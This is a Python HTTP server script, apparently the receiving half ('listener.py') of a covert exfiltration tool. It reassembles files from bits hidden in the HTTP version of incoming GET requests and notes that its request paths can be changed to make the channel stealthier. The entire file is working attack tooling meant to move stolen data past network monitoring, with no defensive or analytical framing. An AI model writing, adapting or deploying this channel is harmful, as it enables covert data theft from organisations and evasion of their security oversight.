import os
import sys
import time
from http.server import BaseHTTPRequestHandler,HTTPServer
from urllib.parse import urlparse,urlsplit,parse_qs

# It is possible to use any value for these 3 paths to make it stealthier but it must be the same in listener.py and sender.py
send_data_path = "/bit" 
generate_file_path = "/newfile"
last_bits_path = "/lastbits"
# Enable or disable requests logging
debug = True
byte_aux = ""
local_file_name = ""


def bitstring_to_bytes(s):
    return int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')


def add_bit(fname, byte_aux):
    written_byte_block = 10
    if (len(byte_aux)%(8*written_byte_block)==0):
        file_byte = bitstring_to_bytes(byte_aux)
        f = open(fname, "ab")
        f.write(file_byte)
        f.close()
        return True


class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global byte_aux,local_file_name
        self._set_response()
        if self.path == send_data_path:
            version_digit = self.request_version.replace("HTTP/1.","")
            byte_aux += version_digit
            byte_written = add_bit(local_file_name,byte_aux)
            if byte_written:
                byte_aux = ""
        elif self.path.startswith(generate_file_path):
            params = parse_qs(urlsplit(self.path).query)
            if 'f' in params:
                local_file_name = (params['f'][0])
                if os.path.isfile(local_file_name):
                    os.remove(local_file_name)
                byte_aux = ""
        elif self.path == last_bits_path:
            if byte_aux != "":
                file_byte = bitstring_to_bytes(byte_aux)
                f = open(local_file_name, "ab")
                f.write(file_byte)
                f.close()


    def do_POST(self):
        self._set_response()

    def log_message(self, format, *args):
        if debug:
            BaseHTTPRequestHandler.log_message(self, format, *args)
        else:
            return


def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


if __name__ == '__main__':
    if len(sys.argv) == 2:
        run(port=int(sys.argv[1]))
    else:
        run()